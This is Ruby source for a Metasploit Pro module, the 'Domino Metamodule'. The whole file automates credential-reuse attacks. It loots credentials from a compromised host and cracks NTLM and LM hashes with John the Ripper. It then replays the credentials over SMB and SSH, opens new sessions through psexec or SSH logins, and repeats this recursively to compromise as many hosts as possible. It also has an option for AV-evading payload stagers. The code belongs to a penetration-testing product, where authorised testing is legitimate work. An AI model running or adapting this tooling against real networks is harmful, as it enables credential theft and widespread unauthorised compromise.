require 'msf/core'
require 'msf/pro/apps/helpers'
require 'msf/pro/task'
require 'metasploit/framework/password_crackers/cracker'
require 'metasploit/framework/password_crackers/wordlist'
require 'metasploit/pro/engine/credential/defaults'
require 'metasploit/pro/engine/credential/exploit_resolver'
require 'memoist'

class MetasploitModule < Msf::Auxiliary
  extend Memoist
  include Msf::Pro::Task
  include Msf::Auxiliary::Report
  include Msf::Pro::Apps::Helpers
  include Metasploit::Pro::Metamodules::RunStats
  include Msf::Pro::Locations

  RUN_STAT_NAMES = [
    :iterations,
    :creds_captured,
    :hosts_compromised,
    :hosts_total
  ]

  attr_accessor :attempted_cred_ids, :looted_session_ids, :remaining_targets
  attr_accessor :current_iteration, :max_iterations, :popped_host_ids

  def initialize
    super(
      'Name'        => 'Domino Metamodule',
      'Description' => 'Command and control for running the Credential Domino attack.
        This metamodule takes credentials from a compromised host and replays them against
        a target environment. On any new sessions it creates, it then repeats this process
        attempting an automatically reuse of all discovered credentials to try and compromise
        as many systems as possible.',
      'Author'      => 'thelightcosine',
      'License'     => 'Rapid7 Proprietary'
    )

    @attempted_cred_ids = []
    @captured_cred_ids = []
    @command_mode = :single_threaded
    @looted_session_ids = []
    @remaining_targets = Set.new
    @current_iteration = 0
    @popped_host_ids = Set.new
    @consumer_threads = []

    register_options([
      OptInt.new('APP_RUN_ID', [true, 'ID of the AppRun saved in the database.']),
      OptBool.new('DynamicStager', [true, 'use Dynamic Stagers for AV evasion on EXE payloads', true]),
      OptString.new('PAYLOAD_METHOD', [true, "The type of payload connection to use (auto, bind, reverse)", "auto"]),
      OptString.new('PAYLOAD_TYPE',  [true, "The type of payload to prefer (meterpreter or command shell)", "meterpreter"]),
      OptAddress.new('PAYLOAD_LHOST', [false, "A specific address to use for LHOST with reverse listeners"]),
      OptString.new('PAYLOAD_PORTS', [true, "The allowed port range for payloads", "1024-65535"])
    ])
  end

  def run
    # since this is in Pro we can assume the db is active
    framework.db.workspace = myworkspace

    initialize_task
    initialize_mutexes
    initialize_run_stats(RUN_STAT_NAMES)

    @max_iterations = app_run.config['max_iterations']
    app_run.run!

    self.step_count = app_run_contains_report? ? 3 : 2
    self.step_count += 1 if app_run.config['cleanup_sessions'] == true
    next_step "Identifying Target Services"
    initial_targets = target_services
    target_host_count = initial_targets.distinct.count(:host_id)
    update_stat(:hosts_total,target_host_count )
    update_stat(:iterations, 0)
    update_stat(:creds_captured, 0)
    update_stat(:hosts_compromised, 0)
    @remaining_targets += initial_targets
    print_status "#{@remaining_targets.count} Services have been targeted across #{target_host_count} Hosts"
    next_step "Gathering Credentials from initial Host"
    begin
      ::Timeout.timeout(app_run.config['overall_timeout']) do
        credentials = initial_creds
        next_iteration(credentials)
      end
    rescue Timeout::Error
      print_status "Overall Timeout Hit, shutting down!"
      @consumer_threads.map(&:kill)
    end
    if app_run.config['cleanup_sessions'] == true
      next_step "Cleaning up..."
      clean_sessions
    end
    if app_run_contains_report?
      next_step "Generating report..."
      run_report
    end
    task_summary "Credentials Domino MetaModule is Complete."
    app_run.reload.complete!
  end

  # Builds the exploit modules used to get sessions from
  # {Metasploit::Credential::Login}s and queues them up.
  #
  # @param :login_ids [Array<Integer>] an array of Login IDs
  def build_modules(login_ids)
    modules_for_service = {}
    module_resolver = Metasploit::Pro::Engine::Credential::ExploitResolver.new(framework: framework, login_ids: login_ids )
    module_resolver.each_module do |msf_module|
      msf_module.register_parent(self)
      msf_module[:task] = self[:task]
      msf_module.init_ui(self.user_input, self.user_output)
      msf_module.datastore['COMMANDER'] = self
      if msf_module.type == 'exploit'
        configure_payload(msf_module, msf_module.rhost)
      end
      login = Metasploit::Credential::Login.find(msf_module.datastore['SOURCE_LOGIN_ID'])
      service = login.service
      modules_for_service[service.id] ||= []
      modules_for_service[service.id] << msf_module
    end
    modules_for_service.each_pair do |k,v|
      @module_queue << v
    end
  end

  # Takes an array of credentials and queues up approrpiate
  # LoginScanners based on those creds for each remaining target service.
  #
  # @param :creds [Array<Metasploit::Credential::Core>] the array of credentials
  def build_scanners(creds)
    remaining_targets.each do |target_service|
      login_scanners = Metasploit::Framework::LoginScanner.classes_for_service(target_service)
      login_scanners.each do |scanner_class|
        # Reject any creds of a type we can't use for this Scanner. e.g. don't use ntlm_hash for SMB etc.
        scanner_creds = creds.select{ |cred| scanner_class::PRIVATE_TYPES.include? cred.to_credential.private_type }
        next if scanner_creds.empty?
        scanner = scanner_class.new(
          bruteforce_speed: 5,
          cred_details: scanner_creds,
          host: target_service.host.address,
          port: target_service.port,
          stop_on_success: false
        )
        @scanner_queue << scanner
      end
    end
  end

  def cleanup
    app_run.reload.complete! # noop if app is already failed or aborted
    @consumer_threads.compact!
    @consumer_threads.map(&:kill)
    super
  end

  def clean_sessions
    sessions = Mdm::Session.joins(:tasks).where(tasks: { id: mdm_task.id})
    db_session_ids    = sessions.map(&:id).join(' ')
    local_session_ids = sessions.map(&:local_id).join(' ')
    opts = {
      'SESSIONS'   => local_session_ids,
      'DBSESSIONS' => db_session_ids
    }
    run_module('auxiliary/pro/cleanup',opts)
  end

  # Takes a {Msf::Session} id and runs the Collect module against it
  # with only relevant options turned on. It then looks for any {Metasploit::Credential::Core}s
  # found during that run, adds them to the list we already know about and returns the bunch from this set.
  #
  # @param :sid [Integer] the id of the {Msf::Session}
  # @return [Array<Metasploit::Credential::Core>] an array of {Metasploit::Credential::Core}s
  def collect_creds(sid)
    opts = {
      'SESSIONS'              => sid.to_s,
      'COLLECT_APPS'          => false,
      'COLLECT_DRIVES'        => false,
      'COLLECT_USERS'         => false,
      'COLLECT_DOMAIN'        => true,
      'COLLECT_SYSINFO'       => false,
      'COLLECT_PASSWD'        => true,
      'COLLECT_SCREENSHOTS'   => false,
      'COLLECT_SSH'           => true,
      'COLLECT_FILES'         => false,
      'COLLECT_FILES_PATTERN' => ' ',
      'CRACK_PASSWORDS'       => false,
      'RunAsJob'              => false
    }

    Rex::ThreadSafe.sleep(2)

    run_module('auxiliary/pro/collect', opts)

    # Find any Creds found by this task that we did not already know about!
    # This is the best way to try and find which creds we just saw, even if
    # the Credential::Core already previously existed.
    new_creds = Metasploit::Credential::Core.joins(:tasks).where(tasks: { id: mdm_task.id }).where(Metasploit::Credential::Core[:id].not_in(@captured_cred_ids))
    cracked_creds = crack_ntlm_hashes(new_creds)

    combined_creds = []
    combined_creds += cracked_creds
    combined_creds += new_creds
    combined_creds.each do |cred|
      @captured_cred_ids << cred.id
    end
    @captured_cred_ids.uniq!
    combined_creds
  end

  def crack_ntlm_hashes(creds)
    tbl = Rex::Text::Table.new(
        'Header'  => 'Cracked Hashes',
        'Indent'   => 1,
        'Columns' => ['DB ID', 'Username', 'Cracked Password']
    )

    cracked_passwords = []

    # process_crack and check_results and print_results methods ported from framework module auxiliary/analyze/crack_windows.rb
    def process_crack(results, cred)
      results = results.clone
      return results if cred['core_id'].nil? # make sure we have good data

      new_crack = create_cracked_credential( username: cred['username'], password: cred['password'], core_id: cred['core_id'])

      # however, a special case for LANMAN where it may come back as ???????D (jtr) or [notfound]D (hashcat)
      # we want to overwrite the one that was there *if* we have something better.
      results.map! { |r|
        r.id == cred['core_id'] &&
            r.private =~ half_lm_regex ?
            new_crack : r
      }

      results << new_crack if !results.include?(new_crack)
      results
    end

    def check_results(passwords, results, hash_type)
      passwords.each do |password_line|
        password_line.chomp!
        next if password_line.blank?
        fields = password_line.split(":")
        # If we don't have an expected minimum number of fields, this is probably not a hash line
        next unless fields.count >=7
        cred = {}
        cred['username'] = fields.shift
        cred['core_id']  = fields.pop
        2.times { fields.pop } # Get rid of extra :
        nt_hash = fields.pop
        lm_hash = fields.pop
        id = fields.pop
        password = fields.join(':') # Anything left must be the password. This accounts for passwords with semi-colons in it
        if hash_type == 'lm' && password.blank?
          if nt_hash == Metasploit::Credential::NTLMHash::BLANK_NT_HASH
            password = ''
          else
            next
          end
        end

        # password can be nil if the hash is broken (i.e., the NT and
        # LM sides don't actually match) or if john was only able to
        # crack one half of the LM hash. In the latter case, we'll
        # have a line like:
        #  username:???????WORD:...:...:::
        cred['password'] = john_lm_upper_to_ntlm(password, nt_hash)
        next if cred['password'].nil?
        results = process_crack(results, cred)
      end
      results
    end

    def print_results(tbl, cracked_hashes)
      cracked_hashes.each do |cred|
        row = [cred.id, cred.public, cred.private]
        unless tbl.rows.include? row
          tbl << row
        end
      end
      tbl.to_s
    end

    cracker = Metasploit::Framework::PasswordCracker::Cracker.new(
      cracker: 'john',
      cracker_path: pro_john_executable
    )
    cracker.hash_path = hash_file(creds)
    ['lm','nt'].each do |format|
      # dupe our original cracker so we can safely change options between each run
      cracker_instance = cracker.dup
      cracker_instance.format = format
      print_status "Cracking #{format} hashes in normal wordlist mode..."
      cracker_instance.mode_wordlist(wordlist.path)
      cracker_instance.crack do |line|
        print_status line.chomp
      end

      print_status "Cracking #{format} hashes in single mode..."
      cracker_instance.mode_single(wordlist.path)
      cracker_instance.crack do |line|
        print_status line.chomp
      end

      if format == 'lm'
        print_status "Cracking #{format} hashes in incremental mode (All4)..."
        cracker_instance.mode_incremental
        cracker_instance.incremental = 'All4'
        cracker_instance.crack do |line|
          print_status line.chomp
        end
      end

      print_status "Cracking #{format} hashes in incremental mode (Digits)..."
      cracker_instance.mode_incremental
      cracker_instance.max_length = 8
      cracker_instance.crack do |line|
        print_status line.chomp
      end

      print_status "Cracked Passwords this run:"
      cracked_passwords = check_results(cracker_instance.each_cracked_password, cracked_passwords, format)
      print_good(print_results(tbl, cracked_passwords)) unless cracked_passwords.empty?
    end
    cracked_passwords
  end

  def create_edge(src_node, dest_node, login)
    edge = nil
    @edge_mutex.synchronize do
      edge = Apps::Domino::Edge.where(dest_node_id: dest_node.id, run_id: app_run.id).first_or_initialize
      edge.source_node = src_node
      edge.login = login
      edge.save!
    end
    edge
  end

  # Takes a configured module and sees if there is already a {Mdm::Session}
  # opened by the same module with the same configuration. If so we return
  # that existing Mdm::Session.
  #
  # @param :mod [Msf::Module] the configured module to check
  # @return [Mdm::Session] if a Session already exists
  # @return [NilClass] if no Session exists
  def existing_session(mod)
    login_id = mod.datastore['SOURCE_LOGIN_ID'].to_i
    if login_id
      login = Metasploit::Credential::Login.find(login_id)
      service = login.service
      host = service.host
      fullname = mod.fullname
      sessions = host.sessions.where(closed_at: nil, via_exploit: fullname)
      sessions.each do |session|
        next unless session.datastore['SOURCE_LOGIN_ID']
        next unless session.tasks.include? mdm_task
        if session.via_exploit == 'exploit/windows/smb/psexec'
          if session_alive?(session)
            return session
          else
            session.closed_at = DateTime.now
            session.save!
          end
        elsif session.via_exploit == 'auxiliary/scanner/ssh/ssh_login'
          username = session.datastore['USERNAME']
          if username == 'root'
            if session_alive?(session)
              return session
            else
              session.closed_at = DateTime.now
              session.save!
            end
          elsif mod.datastore['USERNAME'] == session.datastore['USERNAME'] && mod.datastore['PASSWORD'] == session.datastore['PASSWORD']
            if session_alive?(session)
              return session
            else
              session.closed_at = DateTime.now
              session.save!
            end
          end
        elsif session.via_exploit == 'auxiliary/scanner/ssh/ssh_login_pubkey'
          username = session.datastore['USERNAME']
          if username == 'root'
            if session_alive?(session)
              return session
            else
              session.closed_at = DateTime.now
              session.save!
            end
          elsif mod.datastore['USERNAME'] == session.datastore['USERNAME'] && mod.datastore['PRIVATE_KEY'] == session.datastore['PRIVATE_KEY']
            if session_alive?(session)
              return session
            else
              session.closed_at = DateTime.now
              session.save!
            end
          end
        end
      end
    end
    return nil
  end

  # Takes an array of login_ids and attempts to open sessions with them.
  #
  # @param :login_ids [Array<Integer>] the array of login_ids to get sessions from
  # @return [Array<Mdm::Session>] the array of successfully opened sessions
  def get_session_from_logins(login_ids)
    new_sessions = Set.new
    unless login_ids.empty?
      max_threads     = [16, login_ids.count].min
      @module_queue   = Queue.new
      @sessions_queue = Queue.new
      build_modules(login_ids)
      max_threads.times do |n|
        @consumer_threads << framework.threads.spawn("Domino-Module-Worker-#{n}", false) do
          loop do
            begin
              # If the producer is not done this should block and wait for something to show up in the Queue
              msf_modules = @module_queue.pop(true)
              run_session_module(msf_modules)
            rescue ThreadError
              break
            end
          end
        end
      end
      @consumer_threads.map(&:join)
      until @sessions_queue.empty?
        new_session = @sessions_queue.pop
        unless popped_host_ids.include? new_session.host.id
          increment_stat(:hosts_compromised)
          popped_host_ids << new_session.host.id
        end
        new_sessions << new_session
      end
    end
    # Remove the targets for these hosts as we have compromised them now
    new_sessions.each do |session|
      remove_targets(session.host)
    end
    new_sessions
  end

  def hash_file(creds)
    hashlist = Rex::Quickfile.new("hashes_tmp")
    creds.each do |cred_core|
      credential = cred_core.to_credential
      next unless credential.private_type == :ntlm_hash
      user        = credential.public
      hash_string = credential.private
      id          = cred_core.id
      hashlist.puts "#{user}:#{id}:#{hash_string}:::#{id}"
    end
    hashlist.close
    print_status "Hashes Written out to #{hashlist.path}"
    hashlist.path
  end

  # Takes a Host and checks the AppRun config to see if the host
  # is a High Value Target.
  #
  # @param :host [Mdm::Host] the Host to check
  # @return [TrueClass] if the Host is a High Value Target
  # @return [FalseClass] if the Host is NOT a High Value Target
  def high_value_target?(host)
    tagged_hosts = Mdm::Host.joins(:tags).where(tags: { name: app_run.config['high_value_tags'] })
    if app_run.config['high_value_addresses'].include? host.address
      true
    elsif tagged_hosts.include? host
      true
    else
      false
    end
  end

  # Gets the first set of Credentials to begin our run with. If the {Apps::AppRun} was configured
  # with an initial Session, it loots that session. If it was configured with an initial login
  # it gets a session with that login first, then loots it.
  #
  # @return [Array<Metasploit::Credential::Core>] the captured Credentials
  def initial_creds
    first_creds = Set.new
    if app_run.config['initial_session_id']
      first_session = Mdm::Session.find(app_run.config['initial_session_id'])
    elsif app_run.config['initial_login_id']
      login = Metasploit::Credential::Login.find(app_run.config['initial_login_id'])
      first_creds << login.core
      first_session = get_session_from_logins([login.id]).first
    end
    if first_session.nil?
      first_host = login.service.host
      node = node_for_host(first_host, current_iteration)
      core = login.core
      add_core_to_node(core, node)
    else
      first_host = first_session.host
      remove_targets(first_host)
      first_creds += collect_creds(first_session.local_id)
      first_creds.each do |new_cred|
        node = node_for_host(first_host, current_iteration)
        add_core_to_node(new_cred, node)
        node.save!
      end
      looted_session_ids << first_session.id
    end
    first_creds
  end

  # Recursively runs through iterations of replaying credentials, getting new Sessions,
  # opening shells, and looting new credentials from those shells.
  #
  # @param :credentials [Array<Metasploit::Credential::Core>] the credentials to start from for this iteration.
  def next_iteration(credentials)
    @current_iteration += 1
    self.step_count += 1
    increment_stat(:iterations)
    next_step "Begining Domino Replay Iteration #{@current_iteration}"
    new_creds = []
    if credentials.blank?
      print_status "Out of Credentials, shutting down."
    elsif @remaining_targets.count == 0
      print_status "Out of Targets, shutting down."
    elsif max_iterations and (current_iteration > max_iterations)
      print_status "Hit the limit for Max Iterations, shutting down."
    else
      new_logins = replay_creds(credentials)
      unless new_logins.blank?
        new_sessions = get_session_from_logins(new_logins.map(&:id))
        new_sessions.each do |session|
          unless skip_looted_host?(session.host)
            creds_for_session = collect_creds(session.local_id)
            creds_for_session.each do |new_cred|
              new_creds << new_cred
              node = node_for_host(session.host, current_iteration)
              add_core_to_node(new_cred, node)
            end
            looted_session_ids << session.id
          end
        end
      end
      next_iteration(new_creds)
    end
  end

  def node_for_host(host,depth)
    node = nil
    @node_mutex.synchronize do
      node = Apps::Domino::Node.where(host_id: host.id, run_id: app_run.id).readonly(false).first_or_create!
      node.depth = depth
      node.high_value = high_value_target?(host)
      node.save!
    end
    node
  end

  # Takes a host and removes any Target Services from the list
  # for that host. Used to remove hosts we have already compromised.
  #
  # @param :host [Mdm::Host] the Host to remove target services for
  # @return [void] This is not the return value you are looking for.
  def remove_targets(host)
    remaining_targets.reject! do |service|
      service.host == host
    end
  end

  # Takes an array of {Metasploit::Credential::Core}s and runs them through Login Scanners
  # against all remaining target {Mdm::Service}s. It gives us back all successful Logins.
  #
  # @param :creds [Array<Metasploit::Credential::Core>] the creds to replay across our targets
  # @return [Array<Metasploit::Credential::Login>] the successful Logins from our run
  def replay_creds(creds)
    successful_logins = []
    # Spawn a max of 16 threads, if we have fewer targets than that, then spawn a number
    # of threads equal to our count of remaining targets.
    max_threads = [16, remaining_targets.count].min
    @scanner_queue = Queue.new
    @successes =  Queue.new
    build_scanners(creds)
    max_threads.times do |n|
      @consumer_threads << framework.threads.spawn("Domino-Bruteforce-Worker-#{n}", false) do
        loop do
          begin
            # If the producer is not done this should block and wait for something to show up in the Queue
            scanner = @scanner_queue.pop(true)
            run_scanner(scanner)
          rescue ThreadError
            break
          end
        end
      end
    end
    @consumer_threads.compact!
    @consumer_threads.map(&:join)
    # Mark each of these cred IDs as having been attempted already so we don't try them again
    creds.each do |cred|
      attempted_cred_ids << cred.id
    end
    # Get our successes back out of the Queue
    until @successes.empty?
      successful_logins << @successes.pop
    end
    successful_logins
  end

  # Responsible for running the Queued up modules to get Sessions
  # from our new Logins. It then Queues up the {Mdm::Session}
  #
  # @param :msf_modules [Array<Msf::Module>] the module to run
  def run_session_module(msf_modules)
    msf_modules.each do |msf_module|
      previous_session = existing_session(msf_module)
      if previous_session.nil?
        if msf_module.type == 'exploit'
          msf_module.exploit_simple(
            'Payload'        => msf_module.datastore['PAYLOAD'],
            'Target'         => msf_module.datastore['TARGET']
          )
        else
          msf_module.run_simple
        end
        Mdm::Session.joins(:tasks).
          where(tasks: { id: mdm_task.id}).
          where(Mdm::Session[:id].not_in(looted_session_ids)).
          where(via_exploit: msf_module.fullname).each do |session|
          login = Metasploit::Credential::Login.find(msf_module.datastore['SOURCE_LOGIN_ID'])
          next unless session.host == login.service.host
          @sessions_queue << session
          dest_node = node_for_host(session.host, current_iteration)
          if current_iteration > 0
            core = login.core
            source_node = Apps::Domino::Node.joins(:captured_creds).where(metasploit_credential_cores: {id: core.id}).where(run_id: app_run.id).readonly(false).first
            if source_node == dest_node
              print_error "Soruce Node and Destination Node point to the same host: (#{source_node.host.address}"
              print_error "Credential was: #{core.inspect} (#{core.to_credential.to_s}"
            end
            edge = create_edge(source_node,dest_node,login)
          end
        end
      else
        dest_node = node_for_host(previous_session.host, current_iteration)
        if current_iteration > 0
          login = Metasploit::Credential::Login.find(msf_module.datastore['SOURCE_LOGIN_ID'])
          core = login.core
          source_node = Apps::Domino::Node.joins(:captured_creds).where(metasploit_credential_cores: {id: core.id}).where(run_id: app_run.id).readonly(false).first
          if source_node == dest_node
            print_error "Soruce Node and Destination Node point to the same host: (#{source_node.host.address}"
            print_error "Credential was: #{core.inspect} (#{core.to_credential.to_s}"
          end
          edge = create_edge(source_node,dest_node,login)
        end
        @sessions_queue << previous_session
      end
    end
  end

  # Responsible for actually running a LoginScanner and Queueing up successes
  #
  # @param  :scanner [Metasploit::Framework::LoginScanner]
  def run_scanner(scanner)
    begin
      ::Timeout.timeout(app_run.config['service_timeout'].to_i) do
        scanner.scan! do |result|
          result_message = "#{scanner.host}:#{scanner.port}(#{scanner.class.name.demodulize}) #{result.status.upcase} - #{result.credential.to_s}"
          unless result.status == Metasploit::Model::Login::Status::SUCCESSFUL
            print_status result_message
            next
          end
          print_good result_message
          credential_data = result.to_h
          credential_data.merge!(
            module_fullname: self.fullname,
            workspace_id: myworkspace_id,
            task_id: mdm_task.id
          )
          credential_core = create_credential(credential_data)
          parent = result.credential.parent
          parent_cred = parent.to_credential
          unless result.credential == parent_cred
            source_node = Apps::Domino::Node.joins(:captured_creds).where(metasploit_credential_cores: {id: parent.id}).where(run_id: app_run.id).readonly(false).first
            add_core_to_node(credential_core, source_node)
            @captured_cred_ids << credential_core.id
          end
          credential_data[:core] = credential_core
          login = create_credential_login(credential_data)
          host = login.service.host
          src_node = node_for_host(host, current_iteration)
          @successes << login
        end
      end
    rescue Timeout::Error
      print_status "LoginScanner for #{scanner.host}:#{scanner.port} hit timeout, shutting that scan down!"
    end
  end

  # Takes an Mdm::Session and checks if it still has an active
  # Msf::Session attached.
  #
  # @param :session [Mdm::Session] the Session to check
  # @return [TrueClass] if it still has an active session
  # @return [FalseClass] if it does not have an active session
  def session_alive?(session)
    local_session = framework.sessions[session.local_id]
    local_session.present?
  end

  # Checks whether we should skip further looting attempts against
  # a host because we've already looted with max permissions on this host.
  # We would not get anything new if we already looted as SYSTEM or root.
  #
  # @param :host [Mdm::Host] the Host to check
  # @return [TrueClass] if we should skip looting this host
  # @return [FalseClass] if we should continue looting this host
  def skip_looted_host?(host)
    looted_session_ids.each do |session_id|
      mdm_session = Mdm::Session.find(session_id)
      next unless mdm_session.host == host
      # All psexec shells operate at the highest privilege level
      # therefore there is no point looting multiple psexec shells
      # on the same host.
      if mdm_session.via_exploit == "exploit/windows/smb/psexec"
        return true
      end
      if mdm_session.via_exploit.include? "auxiliary/scanner/ssh/ssh_login"
        username = mdm_session.datastore['USERNAME']
        if username == 'root'
          return true
        end
      end
    end
    false
  end

  # Finds all of the appropriate target services based on the hosts
  # defined in the {Apps::AppRun} config.
  #
  # @return [ActiveRecord::Relation] a Relation of the matching {Mdm::Service} objects
  def target_services
    services = {
      "SMB" => true,
      "SSH" => true
    }
    target_selector = BruteForce::Quick::TargetSelector.new(
      blacklist_hosts: app_run.config['excluded_addresses'].join("\n"),
      services: services,
      whitelist_hosts: app_run.config['target_addresses'].join("\n"),
      workspace: myworkspace
    )
    target_selector.target_services
  end

  def wordlist
    factory_defaults = Rex::Quickfile.new("factory_defaults")
    Metasploit::Pro::Engine::Credential::Defaults.wordlist.each do |word|
      factory_defaults.puts word
    end
    factory_defaults.close
    wordlist = Metasploit::Framework::PasswordCracker::Wordlist.new(
      custom_wordlist: factory_defaults.path,
      mutate: false,
      use_creds: true,
      use_db_info: true,
      use_default_wordlist: true,
      use_hostnames: true,
      use_common_root: true,
      workspace: myworkspace
    )
    wordlist.to_file
  end
  memoize :wordlist

  private

  def add_core_to_node(core, node)
    @nodes_cores_join_mutex.synchronize do
      old_count = node.captured_creds.distinct.count
      unless node.captured_creds.include? core
        node.captured_creds << core
      end

      new_count = node.captured_creds.count
      node.captured_creds_count = new_count

      if old_count != new_count
        increment_stat(:creds_captured, new_count - old_count)
        node.save!
      end
    end
  end

  def initialize_mutexes
    @edge_mutex = Mutex.new
    @node_mutex = Mutex.new
    @nodes_cores_join_mutex = Mutex.new
  end

  def initialize_task
    if self[:task].nil?
      self[:task] = ::Pro::ProTask.new(nil,nil)
      self[:task].record = Mdm::Task.create!(workspace: myworkspace)
    end
  end

  # @param pwd [String] Password recovered from cracking an LM hash
  # @param hash [String] NTLM hash for this password
  # @return [String] `pwd` converted to the correct case to match the
  #   given NTLM hash
  # @return [nil] if no case matches the NT hash. This can happen when
  #   `pwd` came from a john run that only cracked half of the LM hash
  def john_lm_upper_to_ntlm(pwd, hash)
    pwd  = pwd.upcase
    hash = hash.upcase
    Rex::Text.permute_case(pwd).each do |str|
      if hash == Rex::Proto::NTLM::Crypt.ntlm_hash(str).unpack("H*")[0].upcase
        return str
      end
    end
    nil
  end

  def half_lm_regex
    # ^\?{7} is ??????? which is JTR format, so password would be ???????D
    # ^[notfound] is hashcat format, so password would be [notfound]D
    /^[\?{7}|\[notfound\]]/
  end

  def myworkspace
    app_run.workspace
  end

  def myworkspace_id
    myworkspace.id
  end
end
